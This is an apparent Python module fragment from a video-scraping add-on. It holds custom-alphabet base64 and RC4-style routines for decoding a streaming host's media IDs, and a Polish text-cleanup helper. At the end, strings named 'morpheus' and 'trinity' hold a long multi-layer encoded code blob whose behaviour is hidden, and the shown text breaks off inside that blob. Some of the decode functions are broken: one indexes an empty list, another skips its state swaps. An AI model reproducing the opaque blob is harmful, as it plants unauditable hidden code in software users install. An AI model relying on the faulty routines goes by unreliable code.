    CUSTOM_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='

    ENCODE_TRANS = string.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = string.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)
except:
    STANDARD_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    #CUSTOM_ALPHABET =   b"5uLKesbh0nkrpPq9VwMC6+tQBdomjJ4HNl/fWOSiREvAYagT8yIG7zx2D13UZFXc"  #23/05/22
    CUSTOM_ALPHABET = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'#'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='
    
    
    ENCODE_TRANS = bytes.maketrans(STANDARD_ALPHABET, CUSTOM_ALPHABET)
    DECODE_TRANS = bytes.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)

    
    
    
def encode2(input):
    return base64.b64encode(input).translate(ENCODE_TRANS)
def decode2(input):
    try:    
        xx= input.translate(DECODE_TRANS)
    except:
        xx= str(input).translate(DECODE_TRANS)
    return base64.b64decode(xx)

def vidcloud_deco(media_id):
    try:
        import string
     #   STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        STANDARD_ALPHABETx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
     #   CUSTOM_ALPHABETx =   '0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG='  #23/05/22
        CUSTOM_ALPHABETx =   "51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
    
        ENCODE_TRANSx = string.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = string.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    except:
       # STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
        STANDARD_ALPHABETx = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' #26/05/22
        
        
      #  CUSTOM_ALPHABETx =   b'0wMrYU+ixjJ4QdzgfN2HlyIVAt3sBOZnCT9Lm7uFDovkb/EaKpRWhqXS5168ePcG=' #23/05/22
        CUSTOM_ALPHABETx =   b"51wJ0FDq/UVCefLopEcmK3ni4WIQztMjZdSYOsbHr9R2h7PvxBGAuglaN8+kXT6y"  #26/05/22
        
        
        ENCODE_TRANSx = bytes.maketrans(STANDARD_ALPHABETx, CUSTOM_ALPHABETx)
        DECODE_TRANSx = bytes.maketrans(CUSTOM_ALPHABETx, STANDARD_ALPHABETx)
    
        
        
        
    def encode2x(input):
        return base64.b64encode(input).translate(ENCODE_TRANSx)
    def decode2x(input):
        try:    
            xx= input.translate(DECODE_TRANSx)
        except:
            xx= str(input).translate(DECODE_TRANSx)
        return base64.b64decode(xx)
    
    
    

    try:
        media_id = encode2x(media_id)
    except:
        media_id = encode2x(media_id.encode('utf-8')).decode('utf-8')
   # seed = 'LCbu3iYC7ln24K7P'  #23/05/22
    seed = 'dOuhV3IsSvf7jeI5' #28/05/22
    
    
    
    
    
    
    #
    array_list = list(range(0, 256))
    
    j = 0;
    
    pix_color = "";
    
    length = 256;
    
    i = 0;
    for i in range(length):
    
        j = (j + array_list[i] + ord(seed[i%len(seed)]))%length
    
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
    j = i = 0;
    
    index = 0;
    for index in range(len(media_id)):
    
        i = (i + index) % length
        j = (j + array_list[i]) % length;
        tmp = array_list[i];
        array_list[i] = array_list[j];
        array_list[j] = tmp;
    
        if sys.version_info >= (3,0,0):
            try:
                pix_color += chr((media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
            except:
                pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )
        
        else:
            pix_color += chr(ord(media_id[index])^ array_list[(array_list[i] + array_list[j]) % length] )

    if sys.version_info >= (3,0,0):
        pix_color=pix_color.encode('Latin_1')

    pix_color = encode2x(pix_color)

    if sys.version_info >= (3,0,0):
        pix_color = pix_color.decode('utf-8')

    return pix_color;
    
    
#function av(n, t) {
#    var r = _0x450c;
#    for (var i, u = [], e = 0, o = r7, c = 0; c < 256; c++) u[c] = c;
#    for (c = 0; c < 256; c++) e = (e + u[c] + n[K4 + e4 + s4](c % n[ii])) % (256), i = u[c], u[c] = u[e], u[e] = i;
#    for (var c = 0, e = 0, f = 0; p.rdOti(f, t[ii]); f++) e = (e + u[c = p[r(1086) + "Dg"](c, 1) % (256)]) % (256), i = u[c], u[c] = u[e], u[e] = i, o += A3[e5 + qt + e4](t[K4 + e4 + s4](f) ^ u[p.AXpPG(u[c] + u[e], 256)]);
#    return o;
#}
    
def dekodujNowe(t,n): #16.08.21
    #n = encode2(n)
    r=[]
    i=[]
    u=0
    x=''
    c = 256
    for o in range(c):
        i.append(o)
    o=0

    for o in range(c):
        #u = (u + i[o] + t.charCodeAt(o % t.length)) % c
        u = (u + i[o] + ord(t[o%len(t)]))%c
        r = i[o]
        #i[o] = i[u]
        #i[u] = r
    e = 0
    u = 0
    o =0

    for e in range(len(n)):
        u = (u + 1) % 256
        r = i[u]
    
    
    
    
    
    
    #e+=1
        #o = (o + e) % c
        #u = (u + i[o]) % c
        #r = i[o]
        #i[o] = i[u]
        #i[u] = r
    #x += String.fromCharCode(n.charCodeAt(e) ^ i[(i[o] + i[u]) % c])
        if sys.version_info >= (3,0,0):
            try:
                x += chr((n[e])^ i[(i[o] + i[u]) % c] )
            except:
                x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
        else:
            x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
    return x
#
def dekodujNowexxx(t,n):
    r=[]
    i=[]
    o=0
    s=''
    c = 256
    for u in range(256):
        i.append(u)
    for u in range(256):    
        o = (o + r[u] + ord(t[u%len(t)]))%256
        i = r[u]
    e = 0
    u = 0
    o =0
    for e in range(len(n)):
        u = (u + 1) % 256
        i = r[u]
        #s+=
        try:
            s += chr((n[e])^ r[(r[u] + r[o]) % c] )
        except:
            s += chr(ord(n[e])^ r[(r[u] + i[u]) % c] )  
    
    return s
    
    

def dekoduj(r,o):

    t = []
    e = []
    n = 0
    a = ""
    for f in range(256): 
        e.append(f)

    for f in range(256):

        n = (n + e[f] + ord(r[f % len(r)])) % 256
        t = e[f]
        e[f] = e[n]
        e[n] = t

    f = 0
    n = 0
    for h in range(len(o)):
        f = f + 1
        n = (n + e[f % 256]) % 256
        if not f in e:
            f = 0
            t = e[f]
            e[f] = e[n]
            e[n] = t

            a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])
        else:
            t = e[f]
            e[f] = e[n]
            e[n] = t
            if sys.version_info >= (3,0,0):
                #a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])
                
                try:
                    a += chr((o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr((n[e])^ i[(i[o] + i[u]) % c] )
                except:
                    a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])#x += chr(ord(n[e])^ i[(i[o] + i[u]) % c] )
                
                
                
                
                
                
                
            else:
                a += chr(ord(o[h]) ^ e[(e[f] + e[n]) % 256])

    return a

def PLchar(char):
    if type(char) is not str:
        char=char.encode('utf-8')
    char = char.replace('\\u0105','\xc4\x85').replace('\\u0104','\xc4\x84')
    char = char.replace('\\u0107','\xc4\x87').replace('\\u0106','\xc4\x86')
    char = char.replace('\\u0119','\xc4\x99').replace('\\u0118','\xc4\x98')
    char = char.replace('\\u0142','\xc5\x82').replace('\\u0141','\xc5\x81')
    char = char.replace('\\u0144','\xc5\x84').replace('\\u0144','\xc5\x83')
    char = char.replace('\\u00f3','\xc3\xb3').replace('\\u00d3','\xc3\x93')
    char = char.replace('\\u015b','\xc5\x9b').replace('\\u015a','\xc5\x9a')
    char = char.replace('\\u017a','\xc5\xba').replace('\\u0179','\xc5\xb9')
    char = char.replace('\\u017c','\xc5\xbc').replace('\\u017b','\xc5\xbb')
    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace("&gt;",">") 
    char = char.replace("&Iacute;","Í").replace("&iacute;","í")
    char = char.replace("&icirc;","î").replace("&Icirc;","Î")
    char = char.replace('&oacute;','ó').replace('&Oacute;','Ó')
    char = char.replace('&quot;','"').replace('&amp;quot;','"')
    char = char.replace('&bdquo;','"').replace('&rdquo;','"')
    char = char.replace("&Scaron;","Š").replace("&scaron;","š")
    char = char.replace("&ndash;","-").replace("&mdash;","-")
    char = char.replace("&Auml;","Ä").replace("&auml;","ä")

    char = char.replace('&#8217;',"'")
    char = char.replace('&#8211;',"-")  
    char = char.replace('&#8230;',"...")    
    char = char.replace('&#8222;','"').replace('&#8221;','"')   
    char = char.replace('[&hellip;]',"...")
    char = char.replace('&#038;',"&")   
    char = char.replace('&#039;',"'")
    char = char.replace('&quot;','"')
    char = char.replace('&nbsp;',".").replace('&amp;','&')
    
    
    
    char = char.replace('Napisy PL',"[COLOR lightblue](napisy pl)[/COLOR]")
    char = char.replace('Lektor PL',"[COLOR lightblue](lektor pl)[/COLOR]")
    char = char.replace('Dubbing PL',"[COLOR lightblue](dubbing pl)[/COLOR]")   
    return char 

import base64, codecs
morpheus = 'IyBlbmNvZGVkIGJ5DQojIEZURw0KDQppbXBvcnQgYmFzZTY0LCB6bGliLCBjb2RlY3MsIGJpbmFzY2lpDQptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NDYzMjUwMzY3MzcxNTMzNTY2NzU1MjdhNmUyYjM0MzA2YTc5NjM2MjZlNTY3MjM1NDEyYjZmNGM3MTU0NzA2YjVhNGE3NDU5MzY2NDc4NTE3NjZiNGM2NzM5NTU3NjZjNDQ2NDQ2NTk1NzRmNzc3NTU1NTY2ODJiMzk2NDUwNzI0NTZhMzI3NTY2NjYzMjM5NDk3YTZkNTk1MjM3MzI2ZjYzNDIzMjRmNmE0OTJiNTY2YjUyNmI3MjZhN2EyZjM3NTMyYjQ4NTMzMzZlMzk2NTY2NmEzNTZjMmY2NjY4MzkzOTJmMmIzMjMxMzg1NzcxNjY2NjM3NjIzNzJmMmY2NDZkNzI2MTM2MmIzMzcyNGMyYjJmMzc3Njc4MzU2NTRhNzYyZjM2NDYzOTc4NTIyZjc2NTgzMzMzMzU3MjcyNzI2NjMwMzgzMzUwMmYzNjZjMzMyZjJmNzk3ODM5Nzk2ZDRhMmY2NjZkMzk1NjMzMzQ1NzMxNzEzNjUxNTY1NDRhMzc3MDU3MzA2OTMyNzkyYjQ3NDU3MzZlNjE2ODc0MzMzNzY2N2EzNzJmNDk1MzQ4NTg2NjRlNTk2OTdhNTM2ZTUyNDgyYjZkNGMyYjM4NjUyYjYzNTQ2NjU2NjI3NjU2NmU3YTY1MzI2NTcxNzYzOTQ2N2EzNzU0NzQ2NDMzMzE3MjZkNmM1YTM3Mzc2NTM3NjU0Mzc4Mzk3YTVhNmQ0ZjU5Njk1YTJmNDY0NjYxNzE3YTU0MmI1ODQ5MzIzMTc2NTg0YTMyNzA2ODcwNjQ3MTMzNDM3OTY4MzY0YjM3NjQyYjRlNzU3NTcxNzI2MzYzNTQ1NjZkNmIzOTU1NTk0NzYyNzM3MTRmNGIzMTUzNGY2MTM3NTQ2MjRkNTQzMTZmNzQ3MTVhNzEzMTQ3NWE3MTM3NTIzODcyNGI3MjRkNTg3MTU4NWE1OTJiNTY2YjY4NzE2ZjU1NjY1NzQ5MzgzMTYxMzk0NzMxMzY2MjM3NjgzOTU2NTk1NzZmNzI3NjUwMzk0Yzc2Mzk0NTM1NDg0NzUzNmY0ZTZkNmM1NjU2MzI3MTczNzg1MDcxMzI2MTZlNjI2YzMyNjQ3NTUwNGI2YjY2NTIzNzVhNGIzNjM4N2E0NjcxNGU3NTMzMzU1NjUzNTc1MDZjNzg1MDU4NGI1NTJmNTI1YTQ0NzE3MTUyNzczNjM3NDM3NTQyNDczOTRjMzY2MjZlNmM2MTMzNTM3MzZkNjYzNTU1Nzg3MDMzNmM0MzUxNTg3OTU1NDc2NjRiNzE1ODZlNTU3NDY0NjM3MDdhNzQzNjY2MzIzMzUxMmI1MDUyMzU3ODQ4Nzc3NzU2Nzg3MDZlNWEzNjMzMzQ1ODJmNDczNTYxNjg1NDcwNTE1NTMwNTU3ODcxNmU2ZjUwNjU1MDUyMzA2ZTRkMzY2ZDcwNDI1NDRlNTQ3NDM3NmMzOTRjNjM2ZDc0MzE1MTU2NDE3MjZhMzA2Mjc5Njc0ZTM5Nzg0ODMxMzg2NjUzNTY2ZjM0NjkyZjU3NTYzMDZlNjU1MjRiNGQ1MjM5NDYzNDM1NTIzODQ4NjY0ZTY1NzAyZjUyNjM0YjZiNjgyZjcwNGQ2NDcxNWEyYjc4NTM2NjczMmIzNDY3NmUzNzM0NTg2NTU2MzAzNTUyN2E3MDY1NjI3NzUwMzg3MDRlNzM1YTQxMmI2MTY0MzAyZjc2NWE1NDZlNTY0NzRlNDYzMTZjNzA3MzJiNjk3YTUwNGUzMDM5Njk0ZTcwNDk0ZjQ3NTA3NjQ2Mzc2YjM1NDU0ZjU5NTI0ZDYxNzYzNDRhNzQ0MjYzNmI2NDZlMzk1NTZmNTM2NjY2NTE0ZTU3Nzg0MTdhMzE1NzUyNTI2NjM1Njk1MTMwMzk3MjY4MmI2MjY4NTE1MzY0NDY1MTMzNmY3NzY0MzY1MTc2NDI1NDMwMzY0NTYyMzA2ZTQ5NzIzMjcwNDg3NjRkNmY2ZTRmNDk0ZDRmNTY2YTJmNzE1NDQzMzA0ODczNjkyYjdhNzU1YTdhMzU2MjZhNmI0YzdhNTQ3NjczNTM2MjY2NDk0Njc1NTIyZjUxNzI1NzM1MzgzNTZkMmY3OTQ5MzczNzY1NDE2NjQ0NjIzNTQ4NWE0ZDc2NGQ3MDRlMzk2ZjU4NDU2YzM2NjczOTMzNjc0NTM4NDU0YTM4NzkzNzZmNmU1NDUxNDczMzU1NjQzNjM4Njk0OTU0MzQzNjZiNTI2NTZmNzM2ZDY2NDYyYjU2NDc2NTUxNTg1NzY3Mzg2YTc4Njk2ZTcwNmU2NjU4NDkyZjZhNGM1NzcwNDQ2MzYxNWEzODc3NzMyYjZhNjU0NjJmNzM2YTJiMzk0ODc3NDcyZjM1NzE3MzZkNmY2YTZiNGM2ZDZlNGQzMDY5NDIzNzZiNGEzODQ5MmI0ZjczNDUzOTcxNDQ3NjcwNDE1MDc5NjI1YTQ5NTY3YTM1NDYyYjJiNzA1NjQ0NjY3NTYyNTE2NTc5NzY3OTUzNTE2NDMyNzA2NjQ1NjMzODY4NjY1OTRhNmYzMzQ3NmM2NTU1NjE0YjJmNjc2Njc4NTk2Yzc5Nzk0ZDM0NzAyZjQzNDM0NDY2MzA0ZTc1NzM2NzU4NzA0ZDQ5NTYyZjUyNTI1YTczNTIyYjJiNDQ1ODZiMzI2NTY0MzA3MjM2NzA2YTY3NjgzMjU1NjkyYjZiNzU1MzZhMzU3YTQyMmY2ODJiNGE3MDcwNTA0NTUxNjQzMzUxNzYyYjUxNmQ0ZTM0MzU3MjRiNjc2MjMxNjQ3ODQyNzk0ZTc3MmY2MTdhNDU0OTY2NmIyZjM2NTM1MDQ1NmUzNzY1NmI3YTdhNzc1ODJmNDk3MDc4NDY0YTQ3Mzc3ODQ4NTE3Mzc3NDUyZjU5NGEzMjUxMmY1NjUxNTY2Yjc4Mzk0YTUxMmI3NTQ5MzU0ZDRmMzQ0NDc0MzU1MDZlMzY2ZTQ1NjY1ODZhNjU2ZjQ4NjQ2NzMzNzY1MzY0MzU2YjM1MzI0YTc0MzM0NDU4Nzk2YjJiNGQ1NDY1NTM0OTM0NTc2NjZiNTEzNzUzNjM3MjRhNDM2MjQ5Nzk0ZDQ4Mzk2Zjc1Mzk0ODM3NTM2NzM3MzM3OTM4NDQ2NDc3NDEzMzcwNTM1NTM4Nzk2MjM3NDU2NTY2Njg0Mzc2NzM1MDc5NTg3MDQ4N2E2NzQxNTczNTRhNjU0MzQxNjQ1NTcxNzU1NTZkNjU1NTM0NTU3MDJmNTIzODYxNjY0YzM0MmI0Yjc5NDE0OTMzNDY0NjY2NmQ3MTUxNTAzMTYyNTE0YjJmNzY0NTY5NTA2NjQ2MzU0ZTY0NzE1ODRkNGY2NjRiNjc1ODJmNmYzMzY4NDQ2ZTRhNGQ0ZTRiMmI2OTcxNmU0ZDRjNzU0MjY2NzM2NDM2NjI0ZjRiNTk0NDY1NjE0ODJmNTE2MjZhNjI2OTMyNjc3NTJiNTM1MDMzNGYzODU2NDQ1MjJiNjk3Njc0NzA2NjY4MzU2NDY0Mzg2ODc2NGI1MzM2Njc0NjJiNjk0OTM4NGI3NzQ4NTA3MTc5NDE2MTc4MzU3NzcxNzg3ODQ5NzI3MDQ4MzkzMjY1NDgzNDZlMzg0OTY2MzE3OTZlNDY0NDYzMzEzMzQ0NWE3OTQ1NTQzNDc4NzM0ZTMxNTA0YzU4NTY0YzM4NWE2YTMzNDc3NzRjNzg1ODc1NTk3NDc4MzY0YzcxNDE1ODM4NDY0NzY4NDI1MDQxNTE2MTU4MzEzNTRlNTE0NzM2MzQ1NDM4NTY0ZjRkNjEyYjM1NTc0ZTRmNDY1MDc3NTg2NDY3NGE2NTQ1NDg1MDZiNjIyYjU0MzM2ZjQxMzczODQ0NjUzNjQyMmY0ODQ4MzgzMjUwMzk0NzQxNTg2OTRkNmQ1NTM4NGU2ZjQzNTQ1YTQyNjU3OTQ5MzQzMDQ4NjYzMjQ4Mzc0NTY5Mzc1NDRmNGI1NDQ4NmU3NTUzNzkzMjYzMzgzOTY5NTg2ZDU0NTA2ZDY3NjUzNjU1MmI0YjYxN2E2YzcxNTg0MzQ3Mzc2YjZhMmI1Mjc2NjU2YzM2NTg0YTRkNTc2MTQyN2E3OTZhNTk3MjM4NzE2MTRhMzU3MDM5NDE3YTM0NjY0NzM0NDEzNTM2NjY3OTU1MmY3MDQ3NmYzMTU0NmI1NjM5NTU3OTQxMmY2YjUzMzY3OTMzNmQ3NTU5NGE3NjMzNGY1MjZjNzk3MjQ5NTM2NjVhMzg2YjQ2MmI1MTU0NDk1MzUwNDQ2NjZlMzE1MzQ4NTk2YTc2NDM1YTM4NTAzNjM4Mzg3ODQyMzM0NjQ2MmY1MzY0NmI3MjMwMzQzNzMxNDM2Mzc3NjQzNjUxNDQzNzM1NGM2NTc0NDg2YTZiNDEzMDMxNmE2ODRiNzUzNzQ3N2E1NzZmMzY2NTY1MmY2YzRlNjk1ODRkNTE2ZTM4Njg3NjY4Nzg0OTM1Nzg1MTY1NGU2NDRlNDE1NTc1Nzc1NTM2NGQzMTM2Nzc2NjY2NDU2MTczNzg3YTU2Njk2NzRkNjU0ODY2Nzg0ZjJiNTE0ZjM4NGUzNDM3NTM3ODYxNjc2NzU4NTUzODUxNWE2MzQzNjg0NDZlNjc1NDY1NGU3MzQyNjI2YjY4MzgzNDQ0MzY3NzZhMzM0ODYzNGU2ZTUyNjM0OTMyNzg2OTJmMzQ0NzY2NDE2MjUyNjY1ODU0NjU0MTc5MzY2MzU2Njc3NjQyNzA3MDc2NzU3ODQ0NzM0Nzc0NzQ0ZDVhMzc0NDJmNzk2ODc2MzQ1MjRlMzI0YTQ4Mzg2Nzc2MzA0NjY1Nzc2YTY3MzA0ODM0MzkzODc3Nzk0NzYzNjMzNTQyNTA2NzQ3MzgzMTc4NTU2MzQ1NjU3ODZiNjMyZjc3MzA3NzU2NmEyYjZlNjc0ZDJmNDk3MTc3MzUzODQ2NjI0NzZlNGE2Zjc4NjY2YzY1NGMzMzZiNjQzOTY4NDg0ZjQ0NTM1MTJiNGQzMjJiMzQ2NTRmNDMzODUxNzY3ODUzNGM1ODQ0NjU2Yjc2MmI3NzRlNTg2NzQ2NjU0ZDcxN2E1MTJiNjM0Yjc3NmQ3NjMwNjQyYjRhNzQ3OTc1Nzk1MDM4NjQ2YjcwNGU3MjY3NTM1MDc5Nzc1YTU0Nzg0NDQ4NDkzNjRlNTg0MTU1MmI0NzdhNzI2NjQ2NDUyZjM0MzQ0ZDc3NmUyYjU1NjkyZjMwNTQzODU3NjY0MjY2MzM0NTUwMmI2OTU4NmI3ODZlNzUzOTUxNGMzNTQyNjY1YTUwNDI0ZTM0NGQ0OTQxNzYzOTUyNzg2OTYyNzk2ZjU5MzU0ODc5NDQ2NjQ5NzkzNzcwNmU1MzU4NDY0ODU4NDk0YjM0NGQ3MjZkNjY1OTRlMzY0MjQ4Nzg2YzQ3NTM2ODJiNTM3MjZiNDY2Njc3NDg0Zjc5NGUyYjcxNDEzMDMyNTQzODY0N2E0YTY2Nzg2NTRkNGMzMTQ0NGY0YjZkNTE2YTMxNDI2NDc0NTY3ODUzMmIzOTZhNjY3OTRlMzc0MTY3NjM1MjQ2MzU1MjQ4NDg2MzYyNzY2YjY1Mzk3NjY3NGU1ODQxNjkzNTRjNmM0MTRlMzc2OTU4NjM2NzZlNjEyYjUyNGQzNjQzNzY2YzJmNDk0YjM0MzQ0Yzc4NDEzODMzNmI2NzcyMzk0NjM4NjI0YzM1NjYzNDc3MzM0NjRiMzgzMDUwNjM3MzQ2NjY0ZDUzMzc3OTU3NDk3MjMzNmI3YTJiNGU3MDQ2NjU0YjRjMzUzMTZlNmYzMTM3NzI2YjJmNzk0ODM4Njg3YTZjNGQ1OTZmNTA3ODQyMmY3MTUwMzg2ODUwNjM1NTVhMzQ3Mjc2MzI2MzM0Njg3NjMyNTMzOTMyNmU3NjUwNzczNzMxNzk2NDU1NGMzNTRiMzg2Nzc1NGY0NjM1NmQ1Njc5NDg0NjU1NmMzNTY3NjQzOTMwN2E3NTQyMzIzNDU0NDY1ODQ4MmY1NTcxNDI3NTQyNzc3OTUwNTg1NDczNDQ2YzZjNGY0OTc5NTA1OTM2NmY1MjM4Njg3NTQ5MzI0OTYxMzk2MzYzNGI2NTYyNDUzNjM2NzY3YTQ1NGY0Mjc1NzgzMzY1NDU2YTY0NDEyZjU4NDYzNjZhNTAzMTczNDM0YzQ2NGM2ODRhMmI0NTUwMzY1YTY2Mzk0MjJmNGI0ZDRmNTI0YTc3NDI1MDMwNmM1MDc5NGM3NTQ5MzU3OTYzNGY2YjMxMzk2ZDMwNDkzMjQ2NjU2NzcwMzU1NzQ2NTUyZjUwN2E2Yjc1NzU1NjM2NDI0ODQ3NTE2NjMwNmE2NjM4NTI0NzZlMmY3NDQ5NDQ3YTRiMmI1MTQ0NjIzODY2MmI0MzQ4MmY0MjJiMmI0Njc2NzE0MTQ2NWE2Njc3MzQyYjRiNjY1YTUyN2EzNTRjMzk3OTU2Mzk1MTJmNzk0YjY1NDg3NDQxNGM3YTYyNTA2ZDc1NmY2MjZlNDE0Yzc3NmI3NjMwNzY3ODY1MzY2MjQ4NTI2MTM0NjI3NTYzNWEzNTc3NDYzNzQ5NjY2NjY5NmUyZjY2NTY2ZjUxNjUzOTYzNTQzNjRhMmI1MTJiMzE2NTQ5NTczODQyNjY3OTY4NTc0NzJiNTE3NjM2NDc0ODQ4Mzg1MTQ4MmYzMTU0NmQ0ODM4NzQzNjQ5NTA0OTZjMzY0MTYyNjk1NDM2NTI3MjQ2NTE3MDMxNjM2MzcwMzI2YzM4N2E0NjMwNzE3ODQ0NDg2YjRhNzY3NDc1NDI3NDJmNjE3Mjc1NTE1ODc5NmQzMjRmMmY3NzYxNjQ1MTZlNzk0YTc0NTUzMTRmNmEyYjY3Mzc3MDM4Njk2MjMzNDE0ZTUxNmE2YTRjNjQ1NTM4NDY1NDRmNDIzNjM0MzU2YzZhNGE2NDZiNjIzMjQyNDk3ODM3NzE0MTJiNmY0NDc4NmU3NzY5MmIzNDY2MzY0NDM1NjM3MjMzNmQ3NzQ5MmY0YTM3N2EzMjc1NjY3ODcyMzk0ODQ4Nzc1OTY0NTI1Njc5NTAyZjUzNDUyZjQ5NzYzNjY3NzY1NDU5NDE0NjJiNDI0YTM4Njc2YTc5NDM2ZDc1Nzk2NjRiNjc0ODZlNGUzNDQ4Njg2MjU4NTI3OTU0NzY1MzczMmY1NDUxNmQzMTQyNjU2NzUzMmI1MDM5NDI1ODYzNGEyYjUxNjM3NjMxNzE2MzY0MmY0MTRkNmI3MjZiMzk1MTY2Nzc2ZDUwNDQ2NzQyNDQzOTY2NzAzMTU0MzM0MTZlNTA0OTQ0MzU1MzRmNjQzNjM3NDQ3OTU2MmI0MTQ1Nzc2MjU4NzU3ODZmNjY0YzQ5MzYyZjY5NzU1NDZlNjY0MTc3MmY0NTRkNDQ1NDQ4NmU3MTZjNzU2ODYzMzQ0NDYyNzk2OTY1NDk1NTY1Njc0YjczMzczOTQ2NmE0MTQ3NjU1MTZjNzg0YTRmMzk1YTZlN2E0YTc1NDkzNTY3NjYzNjYzMzg0MzZhMmY1ODJmNjc2NDczNjU1MDZmNzQzMTU2NTg3NzM3N2E1ODZhNTczNjU0N2E3MjM2NjU2NTM5NzA1ODc3NDIyYjQxNDM0ZDQ5NTQ2NTQ5NjQ0Mzc2NjY0ODRjMzg2Zjc4MzY2OTc2NDU2MjJiNGY2YTQzNTc3MDU5N2E0YzY5NDczOTU0Mzk3OTMzNmY1YTMwNjcyZjc5NGI3MzZiNWEzNDQ4NjY3MTc5NTA2OTU5Nzc3MjM4MzU3MjZhNTA2ZjU3MmY0OTU4NDc0ZTM4Nzk2YTc2NmYzMTc5Njc3NjQ5MzAzOTU4NTg0ODJmNDI2NDZjNTAzMjQ4MzQzNDcyNzk2YjUwNjM1ODM3NmE1MDc2NDk2MjM0NGE0ODJmNDkzMjVhMzY3MzU2Mzg2MjY4NDY0ODMxNmI3OTU0Njg0MTM4NTY3NDc4NzI2MzYyMzE0ZjMzNDE0YjRmNDk3Mjc4NmY2ZDYzMmY3Nzc2NmI1MjJmNTEzOTc5NDI3MjM2NjY2NDRhNzk2ODUwNmE3MDc5NjYzNDY4NTAzMDZhNTA3OTQ0NjQ2ZDY4NTI0Yzc5Njg0YzcyNjMzNTRjMzQzODM3N2E3MDY0NzM0YTM0MmYzNzc3NzU2YzRiMzk3OTZiNmQ1OTM3NjU0NDY1NzQ2NjU2NjQ1MTU0NDYzMTQxMzcyYjMyNjI0MjY0NjI1MDVhN2EzMjRhNDg0NzcwNjY2NjU3NzE0NTRkNGE2ODM4NmEzMjUyMzgzNzcyNzc0MzMzNGYyYjc5NTA2ZTRhNzc1MDM5NzA3NTRjNzI3MDYxMzQ1ODZiNTE2NDMxMzM2YjRjNjQ3OTcyNmE0YjY0NjIzMjc1MzUzNTQ1NTA1MjM4MzQ3NjRiNjU0ZDY0MzEzODMwMzczMTQ2NmU3NzU4Mzg1YTY4NzI2ODczNjE1ODUyMzg3MDM1NGU0NzQyMzYzOTYzNGIzODYyNzA0NDY2MzI2YzdhNTA1NTMyMzQ3MjY5NzI3NTcyNzk3YTZiNTI0ODZmNzYzNjZlNGI3OTRjMzkzNjUyNTk1MjdhNTU3NTdhMzAzODY4NGYzMTUwMzEzMzYyNDk2NTM5NTQ1NDM3Njc2ODU4NzQ0NjM0N2EzNzcwNzM0YjcyNzA2NDRjNTUyZjY2N2E1MjMxMzE2NjZmNmYyZjY4MmI3NDRjNTYzOTUyNGM3MzM2NDU0MzU4Nzc0YzQ1NjQzMTMwMzc0OTc4MmI3ODQ4NmE0ODUwNDMzNDcyNmY0MjY0NTM1Mjc3NmE2NTRkNGIzOTUyMzc3MTU0NDgzNDJmNjY1YTQ5MmI2NzU3NTA0OTJmMmI3YTZlMzU0OTY2NDk2ODY0N2E3NjU1NDgzMTRhNzU3MzYxMzg0MzYzMmI1MjMxMzk0ODY2NmYzMDM2MzE2NDVhMzI0NTJmNDUzMzc4NjgzMTc4NTQ0NTU1MzU2ODQ4N'
trinity = 'wZ1ZQL4ZzV2BQIuZmxmBGpkAQDmAmMuAwp2BGL2ATH0AmWzAQp0LwpmAGZ0AQpjAwL0MGHlAmt1ZQH1AQtmAQquAmL3ZmEyAGH0LmWzZmL0ZwL0AGR0AQZlAQDlLwpjAQp2AGHjZzL0LGWzAmt0AwD4AGH0BGquZmR1ZQH4Awp1ZGZ3AmR0BQEyAmt1ZQL1AGR2LmZ1AQDlMwZjAwxmAQp4AGL3AmEzAJR3AwpkAwD1ZGWzZmD0AQH4AQR0BQZ4ZmN1ZmL0AQZmAGp3Zmt1ZGL5Zmp1AGZ1AwV0AQL2Amx0BQMvAGpmAwp5AQDmAQD0AwL2MQZ1AmR3AwWzAmZ0ZwZmAwVmAQH0AGN0AwWvAmt0ZmD2AmR0MGZ1AmNmZmL5AzRmAQp0AQRmZQZ3AmVlMwL4AGt3ZwDmAwH3BGLlAmV3ZGH4AmV0MQLmZmH1ZQL0AQDmBGZjAQLlMwZjATH1LGZlAQZ2LGpkAmR2BQZkAGN3AmDmZmp1BGDlZmV0AmZ1AzZ2Lmp4AQt1AGp2AzR1ZmpjAGN3BQD0AGt1AGWzZmH3ZmMwZmx0AQpmZzL2MGH3AJR2AQD1ZmH0BGWvAzL0MwHmATV0LmZ2ZmL3ZmMxZmN2MGZjAQxmBGZ5AzD3ZmEyZmx1ZwMxAGN2AwpmAQxlLwL3AmL1AG